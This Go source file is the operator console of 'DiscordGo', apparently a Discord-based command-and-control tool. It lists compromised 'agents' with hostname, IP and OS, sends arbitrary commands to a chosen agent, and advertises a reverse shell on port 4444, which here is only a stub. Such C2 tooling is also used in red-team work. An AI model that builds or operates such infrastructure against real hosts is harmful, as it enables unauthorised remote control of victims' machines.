package cli

import (
	"DiscordGo/pkg/agents"
	"DiscordGo/pkg/message"
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/bwmarrin/discordgo"
	"github.com/olekukonko/tablewriter"
)

//TODO: Ascii art
// Shell is start of the command line mode
func Shell(dg *discordgo.Session) {
	prompt := "DiscordGo>>> "
	promtpState := "main"
	focusedAgent := ""

	for {
		fmt.Print(prompt)

		consoleReader := bufio.NewReader(os.Stdin)
		command, _ := consoleReader.ReadString('\n')
		cmd := strings.Fields(command)
	
		switch promtpState {
		case "main":
			// fmt.Println("main menu")
			switch cmd[0] {
			case "help":
				mainMenuHelp()
			case "exit":
				fmt.Println("Exiting.")
				os.Exit(0)
			case "interact":
				if len(cmd) > 1 {
					// if uuid is given, check if that UUID exist
					if agents.DoesAgentExist(cmd[1]) {
						focusedAgent = cmd[1]
						prompt = "DiscordGo[" + cmd[1] + "]>> " // TODO: Need to shorten the UUID
						promtpState = "agent"
					} else{
						fmt.Println("Agent: " + cmd[1] + " does not exist")
					}
				} else {
					// if no uuid is provided, say id needs to provided
					fmt.Println("You need to provide an agent ID")
				}
			case "agents":
				listAgents()
			}
		case "agent":
			switch cmd[0] {
			case "exit" :
				fmt.Println("Exiting....")
				os.Exit(0)
			case "help":
				fmt.Println("Help menu")
				agentMenuHelp()
			case "back":
				prompt = "DiscordGo>>> "
				promtpState = "main"
			case "cmd":
				if len(cmd) > 1 {
					fmt.Println("command: " + cmd[1])
					fmt.Println("Target: " + focusedAgent)
					message.CommandMessage(dg, focusedAgent, cmd[1])
				} else{
					fmt.Println("Please provide the command you need executed")
				}
			case "shell":
				fmt.Println("sending a shell to you on port 4444")
			case "ping":
				message.Ping(dg, focusedAgent)
			case "kill":
				// 
			}
		}
	}
}

func mainMenuHelp(){
	table := tablewriter.NewWriter(os.Stdout)
	tableData:= [][]string{
		{"help", "Display this menu"},
		{"exit", "Exiting the server"},
		{"interact <UUID>", "Something something with agent"},
		{"agents", "List all the connected agents"},
		
	}

	table.SetHeader([]string{"Command", "Description"})
	table.AppendBulk(tableData)
	table.Render()
}

func agentMenuHelp(){
	table := tablewriter.NewWriter(os.Stdout)
	tableData:= [][]string{
		{"help", "Display this menu"},
		{"exit", "Exiting the server"},
		{"kill", "stop/remove the agent"},
		{"command", "send command to the agent"},
		{"shell", "send a reverse shell to us"},
		{"ping", "check if the agent is alive"},
		{"back", "Return back to main menu"},
	}

	table.SetHeader([]string{"Command", "Description"})
	table.AppendBulk(tableData)
	table.Render()
}

func listAgents() {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"ID", "Hostname", "IP", "OS", "Status"})

	agentList := [][]string{}

	for _, agent := range agents.Agents {
		data := []string{}
		data = append(data, agent.Agent.UUID)
		data = append(data, agent.Agent.HostName)
		data = append(data, agent.Agent.IP)
		data = append(data, agent.Agent.OS)
		data = append(data, agent.Status)
		// TODO: Add another column to tell when last heard from server

		if agent.Status == "alive"{
			table.SetColumnColor(tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{tablewriter.FgGreenColor})
		} else {
			table.SetColumnColor(tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{tablewriter.FgRedColor})
		}
		agentList = append(agentList, data)
	}

	table.AppendBulk(agentList)
	table.Render()
}